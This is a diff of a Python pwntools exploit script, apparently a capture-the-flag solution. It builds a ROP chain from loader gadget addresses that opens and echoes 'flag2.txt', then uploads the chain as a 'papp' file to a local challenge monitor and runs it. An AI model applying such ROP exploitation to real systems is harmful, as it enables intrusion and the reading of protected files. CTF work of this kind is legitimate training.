@@ -22,12 +22,6 @@ for i in xrange(len(our_shellcode)):
 # step 2: ROP open/read/write flag
 blob[4] += 1
 
-def build_papp(rop):
-    raw = blob + str(Page(0xf0000000, 3, rop))
-    with open('exp2.papp', 'w') as f:
-        f.write(str(raw))
-    return raw
-
 loader_base = 0x10000000
 Xopen = loader_base + 0x410
 Xecho = loader_base + 0x290
@@ -35,10 +29,10 @@ _read = loader_base + 0x80
 _exit = loader_base + 0x30
 ret = loader_base + 0x37
 pop_rdi = loader_base + 0x1b0
-pop_rsi_r15 = loader_base + 0x91d
+pop_rsi_r15 = loader_base + 0x1ae
 
-build_papp('flag2.txt'.ljust(0x10, '\x00')
-    + ''.join(map(p64, [
+exp2_papp = str(blob) + str(Page(0xf0000000, 3, 
+    ('flag2.txt'.ljust(0x10, '\x00') + ''.join(map(p64, [
         ret, ret, ret, ret, ret, ret, ret, ret,
         pop_rdi, 0xf0000000,
         Xopen,
@@ -48,18 +42,17 @@ build_papp('flag2.txt'.ljust(0x10, '\x00')
         pop_rdi, 0xf0000800,
         Xecho,
         _exit
-    ])))
+    ])))))
 
 r = process(['./mon', './init.sys', './loader.sys', './echo.sys',
     './crypto.sys', './svc.uapp', 'root.key', 'flag1.papp', 'flag2.txt'])
 
-def download(app):
-    with open(app) as f:
-        blob = f.read()
-        r.sendline('download %s %d' % (app, len(blob)))
-        r.send(blob)
+def download(app, blob):
+    r.sendline('download %s %d' % (app, len(blob)))
+    r.send(blob)
 
-download('exp2.papp')
+download('exp2.papp', exp2_papp)
+# raw_input('go')
 r.sendline('run exp2.papp')
 
 r.interactive()
